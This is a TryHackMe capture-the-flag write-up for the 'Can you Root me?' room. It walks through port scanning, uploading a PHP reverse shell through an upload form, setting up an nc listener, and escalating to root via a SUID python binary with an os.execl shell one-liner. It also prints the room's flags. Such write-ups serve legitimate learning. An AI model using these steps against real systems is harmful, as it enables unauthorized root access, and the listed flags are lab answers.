# Can you Root me? - Tryhackme CTF

``host: 10.10.180.52``

## Reconnaissance

______
NMAP:

PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
______

**How many ports are open?**

-> 2

**What version of Apache is runnig?**

-> 2.4.29

**What service is running on port 22?**

-> ssh

**What is the hidden directory?**

-> /panel/


## Getting a shell

Using /panel upload form to upload a reverse shell in php

**test.phtml**

```
$ nc -lnvp 7777
```

After executing the reverse shell by php file, find user.txt

``/var/www/user.txt``

-> THM{y0u_g0t_a_sh3ll}

## Privilege escalation

**Search for files with SUID permission, which file is weird?**

Searching for files with SUID permission

```
$ find . -perm /4000
```

> This will find all files with permission /4000 = SUID

``/usr/bin/python``

Why python can be executed with root privileges?
We can explore that, running a bash by python `os.execl` command, so we have access to a root shell. * Privilege Escalation *

```
$ python -c 'import os; os.execl("/bin/sh", "sh", "-p");'
```

**root.txt**

```
$ find / -type f -iname root.txt 2> /dev/null
```

/root/root.txt

-> THM{pr1v1l3g3_3sc4l4t10n}
